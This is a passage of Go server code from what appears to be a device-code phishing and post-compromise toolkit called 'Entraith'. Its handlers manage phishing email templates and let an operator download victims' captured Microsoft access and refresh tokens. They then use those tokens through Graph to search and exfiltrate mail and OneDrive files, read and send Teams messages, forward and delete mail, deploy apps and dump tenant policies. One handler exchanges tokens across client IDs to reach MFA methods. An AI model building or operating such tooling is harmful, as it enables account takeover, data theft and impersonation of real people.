	writeJSON(w, 201, p)
}

func (h *Handler) deleteProfile(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if _, ok := h.Mailer.GetProfile(id); !ok {
		writeError(w, 404, "profile not found")
		return
	}
	h.Mailer.DeleteProfile(id)
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (h *Handler) testProfile(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	profile, ok := h.Mailer.GetProfile(id)
	if !ok {
		writeError(w, 404, "profile not found")
		return
	}

	var body struct {
		To string `json:"to"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.To == "" {
		writeError(w, 400, "to address required")
		return
	}

	testTmpl := &mailer.EmailTemplate{
		Subject:  "Entraith — SMTP Test",
		HTMLBody: "<p>This is a test email from Entraith. SMTP configuration is working correctly.</p>",
	}
	data := mailer.TemplateData{TargetEmail: body.To, RealURL: "https://microsoft.com/devicelogin"}
	if err := mailer.Send(profile, testTmpl, data); err != nil {
		writeError(w, 500, fmt.Sprintf("send failed: %v", err))
		return
	}
	writeJSON(w, 200, map[string]string{"status": "sent"})
}

// --- Email template handlers ---

func (h *Handler) listTemplates(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, h.Mailer.AllTemplates())
}

func (h *Handler) createTemplate(w http.ResponseWriter, r *http.Request) {
	var t mailer.EmailTemplate
	if err := json.NewDecoder(r.Body).Decode(&t); err != nil {
		writeError(w, 400, "invalid body")
		return
	}
	if t.Name == "" || t.Subject == "" || t.HTMLBody == "" {
		writeError(w, 400, "name, subject, and html_body required")
		return
	}
	t.ID = fmt.Sprintf("tmpl-%d", time.Now().UnixMilli())
	t.CreatedAt = time.Now().UTC()
	h.Mailer.SaveTemplate(&t)
	writeJSON(w, 201, t)
}

func (h *Handler) updateTemplate(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	existing, ok := h.Mailer.GetTemplate(id)
	if !ok {
		writeError(w, 404, "template not found")
		return
	}

	var t mailer.EmailTemplate
	if err := json.NewDecoder(r.Body).Decode(&t); err != nil {
		writeError(w, 400, "invalid body")
		return
	}
	t.ID = existing.ID
	t.CreatedAt = existing.CreatedAt
	h.Mailer.SaveTemplate(&t)
	writeJSON(w, 200, t)
}

func (h *Handler) deleteTemplate(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if _, ok := h.Mailer.GetTemplate(id); !ok {
		writeError(w, 404, "template not found")
		return
	}
	h.Mailer.DeleteTemplate(id)
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

// --- Per-target token handlers ---

func (h *Handler) refreshToken(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	refreshed, err := h.Manager.RefreshToken(id, targetID)
	if err != nil {
		writeError(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, refreshed)
}

func (h *Handler) downloadAccessToken(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	token, err := h.Manager.GetTokenByTargetID(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	filename := fmt.Sprintf("at_%s.txt", sanitizeFilename(token.TargetEmail))
	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Write([]byte(token.AccessToken))
}

func (h *Handler) downloadRefreshToken(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	token, err := h.Manager.GetTokenByTargetID(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	if token.RefreshToken == "" {
		writeError(w, 404, "no refresh token available")
		return
	}
	filename := fmt.Sprintf("rt_%s.txt", sanitizeFilename(token.TargetEmail))
	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Write([]byte(token.RefreshToken))
}

// --- Graph API handlers ---

func (h *Handler) graphClient(campaignID, targetID string) (*graph.Client, error) {
	token, err := h.Manager.GetTokenByTargetID(campaignID, targetID)
	if err != nil {
		return nil, err
	}
	return graph.New(token.AccessToken), nil
}

func (h *Handler) graphSearchEmails(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		Query string `json:"query"`
		Top   int    `json:"top"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.Query == "" {
		body.Query = "*"
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.SearchEmails(context.Background(), body.Query, body.Top)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphSearchFiles(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		Query string `json:"query"`
		Top   int    `json:"top"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.Query == "" {
		body.Query = "*"
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.SearchOneDrive(context.Background(), body.Query, body.Top)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGetTeams(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetJoinedTeams(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGetChats(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetTeamsChats(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDeployApp(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		DisplayName     string   `json:"display_name"`
		RedirectURI     string   `json:"redirect_uri"`
		RequestedScopes []string `json:"requested_scopes"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.DisplayName == "" {
		writeError(w, 400, "display_name required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.DeployApp(context.Background(), body.DisplayName, body.RedirectURI, body.RequestedScopes)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDiscoverMailboxes(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.DiscoverUsers(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGetGroups(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroups(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGetOwnedGroups(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetOwnedGroups(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphCloneGroup(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		SourceGroupID  string `json:"source_group_id"`
		NewDisplayName string `json:"new_display_name"`
		Description    string `json:"description"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.SourceGroupID == "" || body.NewDisplayName == "" {
		writeError(w, 400, "source_group_id and new_display_name required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.CloneGroup(context.Background(), body.SourceGroupID, body.NewDisplayName, body.Description)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphSearchUsers(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		Query string `json:"query"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.Query == "" {
		writeError(w, 400, "query required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.SearchUserAttributes(context.Background(), body.Query)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDumpConditionalAccess(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.DumpConditionalAccessPolicies(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDumpApps(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	apps, err := gc.DumpAppRegistrations(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	sps, _ := gc.DumpServicePrincipals(context.Background())
	if sps == nil {
		sps = json.RawMessage(`{"value":[]}`)
	}
	combined := map[string]json.RawMessage{
		"app_registrations":  apps,
		"service_principals": sps,
	}
	data, err := json.Marshal(combined)
	if err != nil {
		writeError(w, 500, "failed to marshal response")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(data)
}

func (h *Handler) graphGetGrants(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetOAuth2PermissionGrants(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDriveLs(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	itemID := r.URL.Query().Get("item") // empty = root
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.ListDriveFolder(context.Background(), itemID, 200)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDriveDownload(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	itemID := r.URL.Query().Get("item")
	filename := r.URL.Query().Get("name")
	if itemID == "" {
		writeError(w, 400, "item parameter required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	body, contentDisp, err := gc.DownloadDriveItem(context.Background(), itemID)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	defer body.Close()

	if contentDisp != "" {
		w.Header().Set("Content-Disposition", contentDisp)
	} else if filename != "" {
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, sanitizeFilename(filename)))
	} else {
		w.Header().Set("Content-Disposition", `attachment; filename="download"`)
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	io.Copy(w, body)
}

func (h *Handler) graphGetMe(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetCurrentUser(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func sanitizeFilename(s string) string {
	replacer := strings.NewReplacer(
		"@", "_at_", "/", "_", "\\", "_", ":", "_", "*", "_",
		"?", "_", "\"", "_", "<", "_", ">", "_", "|", "_",
	)
	return replacer.Replace(s)
}

// --- Export / Delete ---

func (h *Handler) exportCampaign(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	export, err := h.Manager.ExportCampaign(id)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	data, err := export.JSON()
	if err != nil {
		writeError(w, 500, "failed to marshal export")
		return
	}
	filename := fmt.Sprintf("campaign_%s_export.json", id)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Write(data)
}

func (h *Handler) deleteCampaign(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if err := h.Manager.DeleteCampaign(id); err != nil {
		writeError(w, 404, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

// --- SSE ---

func (h *Handler) streamEvents(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	c, ok := h.Manager.GetCampaign(id)
	if !ok {
		writeError(w, 404, "campaign not found")
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")

	flusher, ok := w.(http.Flusher)
	if !ok {
		writeError(w, 500, "streaming not supported")
		return
	}

	sendUpdate := func() bool {
		status, err := h.Manager.GetStatus(id)
		if err != nil {
			return false
		}
		data, err := json.Marshal(status)
		if err != nil {
			return true
		}
		fmt.Fprintf(w, "data: %s\n\n", data)
		flusher.Flush()
		return true
	}

	// Send current state immediately on connect — no waiting for first tick.
	if !sendUpdate() {
		return
	}

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-r.Context().Done():
			return
		case <-c.NotifyCh():
			// Immediate push — QR scan or other server-side event created sessions.
			if !sendUpdate() {
				return
			}
		case <-ticker.C:
			if !sendUpdate() {
				return
			}
		}
	}
}

// --- Helpers ---

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(v)
}

func writeError(w http.ResponseWriter, code int, msg string) {
	writeJSON(w, code, map[string]string{"error": msg})
}

// ─── Webhook listener control handlers ───────────────────────────────────────

func (h *Handler) webhookStatus(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, h.Listener.Status())
}

func (h *Handler) webhookStart(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Port int `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Port == 0 {
		writeError(w, 400, "port required")
		return
	}
	if err := h.Listener.Start(body.Port); err != nil {
		writeError(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, h.Listener.Status())
}

func (h *Handler) webhookStop(w http.ResponseWriter, r *http.Request) {
	if err := h.Listener.Stop(); err != nil {
		writeError(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, h.Listener.Status())
}

func (h *Handler) webhookLogs(w http.ResponseWriter, r *http.Request) {
	n := 100
	entries := h.Listener.GetLogs(n)
	if entries == nil {
		entries = []WebhookEntry{}
	}
	writeJSON(w, 200, map[string]interface{}{
		"entries": entries,
		"total":   h.Listener.Status().Entries,
	})
}

// --- Drive upload / delete / recent ---

func (h *Handler) graphDriveUpload(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	folderItemID := r.URL.Query().Get("folder")
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		writeError(w, 400, "multipart parse failed")
		return
	}
	file, header, err := r.FormFile("file")
	if err != nil {
		writeError(w, 400, "file field required")
		return
	}
	defer file.Close()
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.UploadDriveItem(context.Background(), folderItemID, header.Filename, file)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphDriveDelete(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	itemID := r.URL.Query().Get("item")
	if itemID == "" {
		writeError(w, 400, "item parameter required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	if err := gc.DeleteDriveItem(context.Background(), itemID); err != nil {
		writeError(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (h *Handler) graphDriveRecent(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.ListRecentDriveItems(context.Background())
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// --- Mail handlers ---

func (h *Handler) graphMailFolders(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetMailFolders(context.Background(), r.URL.Query().Get("mailbox"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphMailMessages(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	folderID := r.URL.Query().Get("folder")
	mailboxID := r.URL.Query().Get("mailbox")
	top := 25
	skip := 0
	fmt.Sscanf(r.URL.Query().Get("top"), "%d", &top)
	fmt.Sscanf(r.URL.Query().Get("skip"), "%d", &skip)
	order := r.URL.Query().Get("order")
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetMailMessages(context.Background(), mailboxID, folderID, top, skip, order)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphMailGetMessage(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetMailMessage(context.Background(), r.PathValue("msgId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphMailSend(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		To      []string `json:"to"`
		Subject string   `json:"subject"`
		HTML    string   `json:"html"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || len(body.To) == 0 || body.Subject == "" {
		writeError(w, 400, "to, subject required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	if err := gc.SendMail(context.Background(), body.To, body.Subject, body.HTML); err != nil {
		writeError(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "sent"})
}

func (h *Handler) graphMailReply(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	msgID := r.PathValue("msgId")
	var body struct {
		Comment string `json:"comment"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	if err := gc.ReplyToMessage(context.Background(), msgID, body.Comment); err != nil {
		writeError(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "replied"})
}

func (h *Handler) graphMailForward(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	msgID := r.PathValue("msgId")
	var body struct {
		To      []string `json:"to"`
		Comment string   `json:"comment"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || len(body.To) == 0 {
		writeError(w, 400, "to required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	if err := gc.ForwardMessage(context.Background(), msgID, body.To, body.Comment); err != nil {
		writeError(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "forwarded"})
}

func (h *Handler) graphMailDelete(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	if err := gc.DeleteMessage(context.Background(), r.PathValue("msgId")); err != nil {
		writeError(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (h *Handler) graphMailMove(w http.ResponseWriter, r *http.Request) {
	var body struct {
		DestFolderID string `json:"dest_folder_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.DestFolderID == "" {
		writeError(w, 400, "dest_folder_id required")
		return
	}
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.MoveMessage(context.Background(), r.PathValue("msgId"), body.DestFolderID)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// --- Auth methods ---

func (h *Handler) graphAuthMethods(w http.ResponseWriter, r *http.Request) {
	id, targetID := r.PathValue("id"), r.PathValue("targetId")
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetAuthenticationMethods(context.Background())

	// 403 usually means the captured token lacks UserAuthenticationMethod.Read.
	// Auto-exchange the refresh token with an explicit scope request and retry.
	if err != nil && strings.Contains(err.Error(), "403") {
		if token, terr := h.Manager.GetTokenByTargetID(id, targetID); terr == nil && token.RefreshToken != "" {
			tenantID := h.Manager.TenantID()
			if tenantID == "" {
				tenantID = "organizations"
			}
			for _, cid := range append([]string{h.Manager.ClientID()}, mfaFallbackClients...) {
				pair, eerr := tokenexchange.Exchange(context.Background(), tenantID, cid, token.RefreshToken,
					"", "https://graph.microsoft.com/UserAuthenticationMethod.Read offline_access", false)
				if eerr != nil {
					if isTokenExpiredErr(eerr) {
						err = fmt.Errorf("refresh token expired or revoked — re-capture required")
						break
					}
					// Scope not grantable with this client — try v1 broad resource grant.
					pair, eerr = tokenexchange.Exchange(context.Background(), tenantID, cid, token.RefreshToken,
						"https://graph.microsoft.com", "", true)
				}
				if eerr == nil {
					result, err = graph.New(pair.AccessToken).GetAuthenticationMethods(context.Background())
					if err == nil {
						break
					}
				} else if isTokenExpiredErr(eerr) {
					err = fmt.Errorf("refresh token expired or revoked — re-capture required")
					break
				}
				// Exchange succeeded for scope but auth-methods still 403, or
				// exchange failed for non-expiry reason — keep original 403 error.
			}
		}
	}

	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// --- Teams interactive ---

func (h *Handler) graphTeamChannels(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetTeamChannels(context.Background(), r.PathValue("teamId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphChannelMessages(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetChannelMessages(context.Background(), r.PathValue("teamId"), r.PathValue("chanId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphSendChannelMessage(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Content == "" {
		writeError(w, 400, "content required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.SendChannelMessage(context.Background(), r.PathValue("teamId"), r.PathValue("chanId"), body.Content)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphChatMessages(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetChatMessages(context.Background(), r.PathValue("chatId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphSendChatMessage(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Content == "" {
		writeError(w, 400, "content required")
		return
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.SendChatMessage(context.Background(), r.PathValue("chatId"), body.Content)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphCreateChat(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		MemberIDs []string `json:"member_ids"`
		ChatType  string   `json:"chat_type"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || len(body.MemberIDs) == 0 {
		writeError(w, 400, "member_ids required")
		return
	}
	if body.ChatType == "" {
		body.ChatType = "group"
	}
	gc, err := h.graphClient(id, targetID)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.CreateChat(context.Background(), body.MemberIDs, body.ChatType)
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// --- Group detail handlers ---

func (h *Handler) graphGroupInfo(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupInfo(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupMembers(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupMembers(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupTransitiveMembers(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupTransitiveMembers(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupOwners(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupOwners(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupMemberOf(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupMemberOf(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupDrives(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupDrives(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupSites(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupSites(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphGroupAppRoles(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
